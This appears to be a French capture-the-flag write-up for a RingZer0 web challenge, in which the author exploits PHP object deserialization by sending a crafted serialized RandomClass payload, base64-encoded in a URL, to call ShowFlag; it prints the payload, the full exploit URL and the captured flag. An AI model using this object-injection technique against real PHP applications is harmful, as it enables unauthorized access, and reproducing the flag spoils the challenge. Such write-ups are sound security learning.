Timing is important but not for this challenge...

On voit un base64 dans l'URL alors que normalement dans les challenges on en voit jamais...

J'ai changé ça pour du n'importe quoi. Ça m'a retourné une erreur:

Invalid object instance
Error Stack Trace:
class RandomClass { private static $instance; private $uStruct; public function __construct() { $this->uStruct = (object)array(); } public static function GetInstance() { if(!isset(self::$instance)) { self::$instance = new self(); } return self::$instance; } public function __set($key, $value) { $this->uStruct->$key = $value; } public function __get($key) { return $this->uStruct->$key; } public function DoAction() { $action = $this->uStruct->action; $this->$action(); } public function GetCurrentDate() { GetCurrentDate($this->uStruct); } public function ShowFlag() { if($this->uStruct->time !== null && $this->uStruct->flag == 'Please?') { ShowFlag($this->uStruct); } } public function GetOutput() { return $this->uStruct->output; } }

on voit ce bout de code intéressant:

```php
public function DoAction() {
    $action = $this->uStruct->action;
    $this->$action();
}

public function ShowFlag() {
    if($this->uStruct->time !== null && $this->uStruct->flag == 'Please?') {
        ShowFlag($this->uStruct);
    }
}
```
Bon c'est simple on va envoyer ce payload là en format base64:
O:11:"RandomClass":1:{s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":3:{s:6:"action";s:8:"ShowFlag";s:4:"time";i:1;s:4:"flag";s:7:"Please?";}}

Ca donne donc :
https://ringzer0ctf.com/challenges/41/?o=TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjozOntzOjY6ImFjdGlvbiI7czo4OiJTaG93RmxhZyI7czo0OiJ0aW1lIjtpOjE7czo0OiJmbGFnIjtzOjc6IlBsZWFzZT8iO319

FLAG-Wz87W7Rv0nmK75Hmbq41qc2i
